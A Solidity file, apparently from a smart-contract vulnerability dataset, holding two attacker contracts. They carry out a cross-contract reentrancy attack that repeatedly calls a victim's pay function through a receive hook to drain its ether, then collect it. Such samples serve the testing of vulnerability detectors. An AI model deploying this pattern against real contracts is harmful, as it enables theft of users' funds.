// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../dataset/cross-contract/to-target/ToTarget_ree1.sol";

contract ToTargetRee1Attacker {
    ToTargetRee1 victim;
    ToTargetRee1Attacker2 att2;
    uint counter = 10;

    constructor(address victimAddress) {
        victim = ToTargetRee1(victimAddress);
        att2 = new ToTargetRee1Attacker2();
    }

    function attack() public payable {
        victim.deposit{value: msg.value}();
        victim.pay(payable(address(att2)));
    }

    function reenter() public payable {
        if (address(victim).balance >= 1 ether)
            victim.pay(payable(address(att2)));
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract ToTargetRee1Attacker2 {
    ToTargetRee1Attacker att1;

    constructor() {
        att1 = ToTargetRee1Attacker(msg.sender);
    }

    receive() external payable {
        att1.reenter{value: msg.value}();
    }
}
